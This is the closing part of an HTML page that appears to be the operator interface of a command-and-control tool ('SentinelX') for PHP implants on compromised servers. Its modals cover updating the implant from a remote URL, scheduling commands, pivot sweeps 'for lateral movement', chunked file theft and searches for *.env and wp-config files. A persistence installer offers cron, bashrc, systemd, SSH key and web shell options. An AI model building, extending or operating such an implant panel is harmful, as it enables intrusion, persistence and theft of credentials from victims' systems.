                <h2>Auto-Update Implant</h2>
                <button class="modal-close" onclick="closeModal('updateModal')">Close</button>
            </div>
            <input type="hidden" id="updateId">
            <p style="font-size:12px;color:var(--text-dim);margin-bottom:10px;">Supply a URL to a new implant.php to replace the remote file. Backup is created automatically.</p>
            <input type="url" id="updateUrl" placeholder="https://your-server.com/new_implant.php" style="margin-bottom:10px;">
            <button class="btn btn-primary" onclick="runAutoUpdate()">Update Implant</button>
            <div id="updateResult" class="bulk-result" style="margin-top:10px;"></div>
        </div>
    </div>

    <!-- At/Cron Schedule Modal -->
    <div id="atModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>One-Time Schedule (at/cron)</h2>
                <button class="modal-close" onclick="closeModal('atModal')">Close</button>
            </div>
            <input type="hidden" id="atId">
            <div style="margin-bottom:6px;">
                <label style="font-size:12px;color:var(--text-dim);">Command to execute at scheduled time</label>
                <input type="text" id="atCmd" placeholder="whoami > /tmp/out.txt" style="margin-top:4px;">
            </div>
            <div style="display:flex;gap:6px;">
                <input type="text" id="atTime" placeholder="Time HH:MM" value="14:00" style="flex:1;">
                <button class="btn btn-primary" onclick="runAtSchedule()">Schedule</button>
            </div>
            <div id="atResult" class="bulk-result" style="margin-top:10px;"></div>
        </div>
    </div>

    <!-- Pivot Sweep Modal -->
    <div id="sweepModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Pivot Sweep</h2>
                <button class="modal-close" onclick="closeModal('sweepModal')">Close</button>
            </div>
            <input type="hidden" id="sweepId">
            <p style="font-size:12px;color:var(--text-dim);margin-bottom:8px;">Ping sweep a /24 subnet from the target. Discovers alive hosts for lateral movement.</p>
            <div style="display:flex;gap:6px;">
                <input type="text" id="sweepSubnet" placeholder="Subnet (e.g. 192.168.1)" value="192.168.1" style="flex:1;">
                <input type="number" id="sweepTimeout" placeholder="Timeout (s)" value="1" style="width:80px;">
                <button class="btn btn-primary" onclick="runSweep()">Sweep</button>
            </div>
            <div id="sweepResult" class="bulk-result" style="margin-top:10px;"></div>
        </div>
    </div>

    <!-- Chunked Download Modal -->
    <div id="chunkModal" class="modal modal-wide">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Large File Download (Chunked)</h2>
                <button class="modal-close" onclick="closeModal('chunkModal')">Close</button>
            </div>
            <input type="hidden" id="chunkId">
            <div style="display:flex;gap:6px;margin-bottom:8px;">
                <input type="text" id="chunkPath" placeholder="Remote file path" style="flex:1;">
                <input type="number" id="chunkSize" placeholder="Chunk (KB)" value="1024" style="width:100px;">
                <button class="btn btn-primary" onclick="startChunkedDownload()">Download</button>
            </div>
            <div class="module-toolbar" id="chunkProgress" style="display:none;">
                <span id="chunkStatus">Initializing...</span>
                <progress id="chunkBar" value="0" max="100" style="flex:1;margin:0 8px;"></progress>
                <span id="chunkPercent">0%</span>
            </div>
            <pre id="chunkData" class="file-viewer" style="max-height:400px;display:none;"></pre>
            <div id="chunkResult" class="bulk-result"></div>
        </div>
    </div>

    <!-- Persistence Modal -->
    <div id="persistModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Persistence Installer</h2>
                <button class="modal-close" onclick="closeModal('persistModal')">Close</button>
            </div>
            <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px;">
                <button class="btn btn-sm" onclick="runPersistence('cron')">Cron</button>
                <button class="btn btn-sm" onclick="runPersistence('bashrc')">Bashrc</button>
                <button class="btn btn-sm" onclick="runPersistence('systemd')">Systemd</button>
                <button class="btn btn-sm" onclick="runPersistence('startup')">Startup</button>
                <button class="btn btn-sm" onclick="runPersistence('ssh_key')">SSH Key</button>
                <button class="btn btn-sm" onclick="runPersistence('webshell')">Web Shell</button>
                <button class="btn btn-sm btn-primary" onclick="runPersistence('all')">All</button>
            </div>
            <input type="hidden" id="persistId">
            <div id="persistResult" class="bulk-result"></div>
        </div>
    </div>

    <!-- File Search Modal -->
    <div id="searchModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>File Search</h2>
                <button class="modal-close" onclick="closeModal('searchModal')">Close</button>
            </div>
            <div style="display:flex;gap:6px;margin-bottom:10px;">
                <input type="hidden" id="searchId">
                <input type="text" id="searchPattern" placeholder="Pattern (e.g. *.env, *.config, wp-config*)" style="flex:2;">
                <input type="text" id="searchPath" placeholder="Search path" style="flex:1;font-family:var(--font-mono);">
                <button class="btn btn-primary" onclick="runFileSearch()">Search</button>
            </div>
            <div id="searchResult" class="bulk-result"></div>
        </div>
    </div>

    <!-- Web Request Modal -->
    <div id="webreqModal" class="modal modal-wide">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Web Request (from target)</h2>
                <button class="modal-close" onclick="closeModal('webreqModal')">Close</button>
            </div>
            <input type="hidden" id="webreqId">
            <div style="display:flex;gap:6px;margin-bottom:6px;">
                <select id="webreqMethod" style="width:80px;flex-shrink:0;">
                    <option value="GET">GET</option>
                    <option value="POST">POST</option>
                </select>
                <input type="url" id="webreqUrl" placeholder="https://target-url.com" style="flex:1;">
            </div>
            <label>POST Data (for POST requests)</label>
            <textarea id="webreqData" rows="2" placeholder="key1=value1&key2=value2"></textarea>
            <label>Custom Headers (one per line)</label>
            <textarea id="webreqHeaders" rows="2" placeholder="Authorization: Bearer xxx"></textarea>
            <button class="btn btn-primary" onclick="runWebReq()" style="margin-bottom:10px;">Send Request</button>
            <div id="webreqResult" class="bulk-result"></div>
        </div>
    </div>

    <!-- Update Modal -->
    <div id="updateModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>SentinelX Update</h2>
                <button class="modal-close" onclick="closeModal('updateModal')">Close</button>
            </div>
            <div id="updateInfo" style="padding:8px 0;">
                <div class="loading">Checking for updates...</div>
            </div>
        </div>
    </div>

    <!-- Payload Generator Frame (hidden iframe for downloads) -->
    <iframe id="dlFrame" style="display:none;"></iframe>

    <script src="assets/js/app.js"></script>
</body>
</html>

